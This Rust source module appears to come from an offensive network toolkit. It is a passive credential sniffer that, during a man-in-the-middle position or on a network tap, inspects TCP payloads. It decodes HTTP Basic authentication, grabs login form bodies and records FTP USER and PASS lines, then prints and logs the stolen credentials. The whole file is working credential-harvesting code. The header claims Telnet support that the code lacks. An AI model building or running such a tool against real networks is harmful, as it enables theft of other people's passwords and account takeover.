//! Passive cleartext-credential sniffer. While MITM (or on a span/tap), it
//! inspects TCP payloads for HTTP Basic auth, HTTP login form posts and
//! FTP/Telnet credentials, and logs what it finds.

use base64::Engine;
use pnet::datalink::NetworkInterface;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::Packet;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use crate::log::Logger;
use crate::net::open_channel;

pub fn run(iface: &NetworkInterface, logger: Logger, running: Arc<AtomicBool>) -> std::io::Result<()> {
    let (_tx, mut rx) = open_channel(iface, Some(Duration::from_secs(1)))?;
    println!("sniffing cleartext credentials on {} (Ctrl+C to stop)...\n", iface.name);
    while running.load(Ordering::SeqCst) {
        if let Ok(frame) = rx.next() {
            inspect(frame, &logger);
        }
    }
    Ok(())
}

fn inspect(frame: &[u8], logger: &Logger) {
    let Some(eth) = EthernetPacket::new(frame) else { return };
    if eth.get_ethertype() != EtherTypes::Ipv4 {
        return;
    }
    let Some(ip) = Ipv4Packet::new(eth.payload()) else { return };
    if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp {
        return;
    }
    let Some(tcp) = TcpPacket::new(ip.payload()) else { return };
    let payload = tcp.payload();
    if payload.is_empty() {
        return;
    }
    let src = ip.get_source();
    let dport = tcp.get_destination();
    let sport = tcp.get_source();
    let text = String::from_utf8_lossy(payload);

    // HTTP Basic auth.
    if let Some(b64) = header_value(&text, "authorization:") {
        if let Some(rest) = b64.strip_prefix("Basic ").or_else(|| b64.strip_prefix("basic ")) {
            if let Ok(dec) = base64::engine::general_purpose::STANDARD.decode(rest.trim()) {
                let creds = String::from_utf8_lossy(&dec).into_owned();
                report(logger, "http-basic", &src.to_string(), &creds);
            }
        }
    }

    // HTTP login form post (very common field names).
    if text.starts_with("POST ") {
        if let Some(body) = text.split("\r\n\r\n").nth(1) {
            if let Some(creds) = form_creds(body) {
                report(logger, "http-form", &src.to_string(), &creds);
            }
        }
    }

    // FTP / plaintext protocols.
    if dport == 21 || sport == 21 {
        for line in text.lines() {
            if let Some(u) = line.strip_prefix("USER ") {
                report(logger, "ftp-user", &src.to_string(), u.trim());
            } else if let Some(p) = line.strip_prefix("PASS ") {
                report(logger, "ftp-pass", &src.to_string(), p.trim());
            }
        }
    }
}

fn header_value<'a>(text: &'a str, name: &str) -> Option<&'a str> {
    text.lines()
        .find(|l| l.to_ascii_lowercase().starts_with(name))
        .map(|l| l[name.len()..].trim())
}

fn form_creds(body: &str) -> Option<String> {
    let has_user = ["user", "username", "login", "email"]
        .iter()
        .any(|k| body.contains(&format!("{k}=")));
    let has_pass = ["pass", "password", "passwd", "pwd"]
        .iter()
        .any(|k| body.contains(&format!("{k}=")));
    if has_user && has_pass {
        Some(body.trim().to_string())
    } else {
        None
    }
}

fn report(logger: &Logger, kind: &str, src: &str, creds: &str) {
    println!("[cred] {kind} from {src}: {creds}");
    logger.event(kind, src, serde_json::json!({ "creds": creds }));
}
